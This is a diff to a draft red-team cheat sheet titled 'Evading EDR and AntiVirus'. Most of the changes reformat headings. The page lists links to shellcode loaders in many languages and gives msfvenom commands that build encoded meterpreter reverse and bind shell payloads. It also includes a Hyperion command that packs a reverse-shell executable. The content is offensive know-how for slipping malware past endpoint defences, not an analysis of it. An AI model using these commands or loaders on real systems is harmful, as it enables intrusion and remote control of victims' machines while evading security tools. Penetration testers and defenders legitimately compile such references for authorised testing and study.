@@ -1,5 +1,6 @@
+############################
 Evading EDR and AntiVirus
-=========================
+############################
 
 Status: draft
 
@@ -41,7 +42,7 @@ Go
 C
 ~
 
--  .. code:: c
+-  .. code-block:: c
 
       #include <iostream>
       #include <Windows.h>
@@ -58,18 +59,18 @@ C
 .. _c-2:
 
 C++
-~~~
+====
 
 -  https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8
 -  https://github.com/ReversingID/Shellcode-Loader/tree/master/windows
 
 .NET
-~~~~
+=====
 
 -  https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/
 
 Ruby
-~~~~
+=====
 
 -  https://blog.king-sabri.net/red-team/how-to-execute-raw-shellcode-using-ruby-on-windows-and-linux
 
@@ -77,7 +78,7 @@ Automatic loader
 ----------------
 
 C++/C
-~~~~~
+======
 
 -  https://github.com/TheD1rkMtr/D1rkLrd
 -  https://github.com/NtDallas/Ulfberht
@@ -91,7 +92,7 @@ C++/C
 .. _c-3:
 
 C
-~
+=
 
 -  https://github.com/matro7sh/Selha/blob/main/C/aes-loader-stageless.c
 -  https://github.com/cribdragg3r/Alaris
@@ -102,7 +103,7 @@ C
 -  https://github.com/boku7/BokuLoader
 
 Nim
-~~~
+===
 
 -  https://github.com/aeverj/NimShellCodeLoader
 -  https://github.com/sh3d0ww01f/nim_shellloader
@@ -112,7 +113,7 @@ Nim
 .. _go-1:
 
 Go
-~~
+===
 
 -  https://github.com/matro7sh/myph
 -  https://github.com/matro7sh/221b
@@ -123,7 +124,7 @@ Go
 -  https://github.com/D3Ext/Hooka
 
 Rust
-~~~~
+=====
 
 -  https://github.com/b1tg/rs_shellcode
 -  https://github.com/r4ime/shellcode_loader
@@ -133,28 +134,27 @@ Rust
 Crystal
 ~~~~~~~
 
--  https://github.com/js-on/WeaponizeCrystal/blob/main/shellcode_loader/shellcode_loader.cr
+https://github.com/js-on/WeaponizeCrystal/blob/main/shellcode_loader/shellcode_loader.cr
 
 Generate shellcode
-------------------
-
+====================
 msfvenom
-~~~~~~~~
+=========
 
 -  ``msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<SERVER> LPORT=<PORT> -f raw``
 -  ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f dll``
 -  ``msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai '\x00' -i 30 RHOST=10.0.0.68 LPORT=9050 -f c | tr -d '"' | tr -d '\n' | more``
 
 C2 (Cobalt/Havoc what ever)
-~~~~~~~~~~~~~~~~~~~~~~~~~~~
+=============================
 
 ASM
-~~~
+====
 
 -  https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/
 
 Hyperion
-~~~~~~~~
+=========
 
 -  ``wine hyperion.exe /root/payloads/shellter/shellter_putty_reverse_x86.exe``
 
